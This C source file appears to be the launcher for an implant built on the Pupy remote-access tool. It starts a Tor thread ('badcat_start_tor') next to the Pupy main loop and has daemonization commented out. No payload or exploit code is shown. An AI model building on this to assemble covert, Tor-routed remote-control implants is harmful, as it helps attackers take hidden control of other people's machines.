#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>

#include "pupy_load.h"
#include "daemonize.h"

#ifdef Linux
#include <mcheck.h>
#endif

void badcat_start_tor();

int main(int argc, char *argv[], char *env[]) {
// #ifndef DEBUG
//     daemonize(&argc, &argv, env, true);
// #else
#ifdef Linux
    mtrace();
#endif
// #endif
    pthread_t tor_thread;
    int result;
    
    pthread_create(&tor_thread, NULL, badcat_start_tor, NULL);

    result = mainThread(argc, argv, false);
    pthread_join(tor_thread, NULL);

    return result;
}

void setup_jvm_class(void) {}
